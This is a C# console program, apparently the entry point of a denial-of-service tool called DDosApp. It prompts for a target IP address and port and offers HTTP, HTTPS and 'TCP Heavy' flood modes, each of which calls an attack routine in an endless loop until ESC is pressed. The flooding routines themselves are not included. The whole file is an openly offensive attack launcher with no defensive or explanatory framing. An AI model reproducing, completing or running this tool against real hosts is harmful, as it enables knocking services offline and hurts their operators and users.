using System.Net;
using DDosApp.DDoS_Scripts;

namespace DDosApp
{
    class Program
    {
        public static void Main()
        {
            MainAsync().GetAwaiter().GetResult();
        }

        public static async Task MainAsync()
        {
            while(true)
            {
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("Enter ip to DDoS : ");
                string ip = Console.ReadLine();

                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("Enter port to DDoS : ");
                string port = Console.ReadLine();

                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine($"1 - Http Download\n2 - Https Download\n3 - TCP Heavy");
                char symbol = Console.ReadLine()[0];

                await Switch(ip, port, symbol);
            }
        }

        private static async Task Switch(string ip, string port, char symbol)
        {
            switch (symbol)
            {
                case '1':
                    {
                        Console.WriteLine("Press ESC to stop.");
                        do
                        {
                            while (!Console.KeyAvailable)
                            {
                                await DDOSScript.ProtocolHTTPDownload(ip);
                            }
                        } while (Console.ReadKey(true).Key != ConsoleKey.Escape);
                    }
                    break;
                case '2':
                    {
                        Console.WriteLine("Press ESC to stop.");
                        do
                        {
                            while (!Console.KeyAvailable)
                            {
                                await DDOSScript.ProtocolHTTPSDownload(ip);
                            }
                        } while (Console.ReadKey(true).Key != ConsoleKey.Escape);
                    }
                    break;
                case '3':
                    {
                        Console.WriteLine("Press ESC to stop.");
                        do
                        {
                            while (!Console.KeyAvailable)
                            {
                                await DDOSScript.ProtocolTCPHeavy(IPAddress.Parse(ip), new IPEndPoint(IPAddress.Parse(ip), int.Parse(port)));
                            }
                        } while (Console.ReadKey(true).Key != ConsoleKey.Escape);
                    }
                    break;
                default:
                    break;
            }
        }
    }
}
